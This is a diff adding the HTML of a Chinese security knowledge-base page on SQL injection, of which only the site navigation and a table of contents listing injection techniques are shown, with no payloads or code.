@@ -1,0 +1,2261 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="F1rstb100d个人知识库，努力做一个全栈H4cker">
+      
+      
+        <meta name="author" content="F1rstb100d">
+      
+      
+        <link rel="canonical" href="https://f1rstb100d.github.io/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/">
+      
+      <link rel="icon" href="../../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
+    
+    
+      
+        <title>SQL注入 - F1rstb100d知识库</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.472b142f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.08040f6c.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#4051b5">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sql" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="F1rstb100d知识库" class="md-header__button md-logo" aria-label="F1rstb100d知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            F1rstb100d知识库
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SQL注入
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/f1rstb100d/f1rstb100d.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    f1rstb100d.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../.." class="md-tabs__link">
+      知识库结构
+    </a>
+  </li>
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../sqlmap%E4%BD%BF%E7%94%A8/" class="md-tabs__link md-tabs__link--active">
+        Web安全
+      </a>
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/" class="md-tabs__link">
+        二进制安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-tabs__link">
+        内网安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/" class="md-tabs__link">
+        环境配置
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="F1rstb100d知识库" class="md-nav__button md-logo" aria-label="F1rstb100d知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    F1rstb100d知识库
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/f1rstb100d/f1rstb100d.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    f1rstb100d.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        知识库结构
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Web安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Web安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          SQL注入
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL注入" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          SQL注入
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlmap%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        sqlmap使用
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          SQL注入
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        SQL注入
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sql_1" class="md-nav__link">
+    Sql基础
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    分类
+  </a>
+  
+    <nav class="md-nav" aria-label="分类">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    基于注入位置
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    基于闭合方法
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    基于注入语句类型
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    注入方法总结
+  </a>
+  
+    <nav class="md-nav" aria-label="注入方法总结">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    联合查询
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    报错注入
+  </a>
+  
+    <nav class="md-nav" aria-label="报错注入">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#updatexml" class="md-nav__link">
+    updatexml()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extractvalue" class="md-nav__link">
+    extractvalue()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#floor" class="md-nav__link">
+    floor()
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    布尔盲注
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    时间盲注
+  </a>
+  
+    <nav class="md-nav" aria-label="时间盲注">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sleep" class="md-nav__link">
+    sleep()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#benchmark" class="md-nav__link">
+    benchmark()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    笛卡尔积
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get_lock" class="md-nav__link">
+    GET_LOCK()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rlike-regexp" class="md-nav__link">
+    RLIKE REGEXP正则匹配
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    宽字节注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    二次注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    堆叠注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#order-by" class="md-nav__link">
+    order by注入
+  </a>
+  
+    <nav class="md-nav" aria-label="order by注入">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    数字型注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    字符型注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    布尔盲注
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    时间盲注
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    约束攻击
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    利用方法
+  </a>
+  
+    <nav class="md-nav" aria-label="利用方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#information_schema" class="md-nav__link">
+    information_schema套路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#into-oufileshell" class="md-nav__link">
+    into oufile写shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#load_file" class="md-nav__link">
+    load_file读文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mysql-dnslog" class="md-nav__link">
+    MySQL DNSlog盲打
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    过滤绕过
+  </a>
+  
+    <nav class="md-nav" aria-label="过滤绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    过滤了空格
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql_2" class="md-nav__link">
+    区分大小写过滤了SQL关键词
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql_3" class="md-nav__link">
+    不区分大小写过滤了SQL关键词
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    过滤了引号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    过滤了逗号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    过滤了比较符&lt; &gt;
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#or-and-xor-not" class="md-nav__link">
+    过滤了 or and xor not
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    过滤了注释符
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    过滤了=
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    HTTP参数污染绕过
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          XXE
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          XXE
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XXE/XXE%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        XXE漏洞
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3" type="checkbox" id="__nav_2_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3">
+          反序列化
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="反序列化" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          反序列化
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        Java反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        PHP反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        Python反序列化
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_4">
+          文件上传
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="文件上传" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          文件上传
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        文件上传总结
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          二进制安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="二进制安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          二进制安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        PWN入门
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          内网安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="内网安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          内网安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-nav__link">
+        PTH传递攻击
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          环境配置
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="环境配置" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          环境配置
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        Git入门
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sql_1" class="md-nav__link">
+    Sql基础
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    分类
+  </a>
+  
+    <nav class="md-nav" aria-label="分类">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    基于注入位置
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    基于闭合方法
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    基于注入语句类型
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    注入方法总结
+  </a>
+  
+    <nav class="md-nav" aria-label="注入方法总结">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    联合查询
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    报错注入
+  </a>
+  
+    <nav class="md-nav" aria-label="报错注入">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#updatexml" class="md-nav__link">
+    updatexml()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extractvalue" class="md-nav__link">
+    extractvalue()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#floor" class="md-nav__link">
+    floor()
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    布尔盲注
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    时间盲注
+  </a>
+  
+    <nav class="md-nav" aria-label="时间盲注">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sleep" class="md-nav__link">
+    sleep()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#benchmark" class="md-nav__link">
+    benchmark()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    笛卡尔积
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get_lock" class="md-nav__link">
+    GET_LOCK()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rlike-regexp" class="md-nav__link">
+    RLIKE REGEXP正则匹配
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    宽字节注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    二次注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    堆叠注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#order-by" class="md-nav__link">
+    order by注入
+  </a>
+  
+    <nav class="md-nav" aria-label="order by注入">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    数字型注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    字符型注入
+  </a>
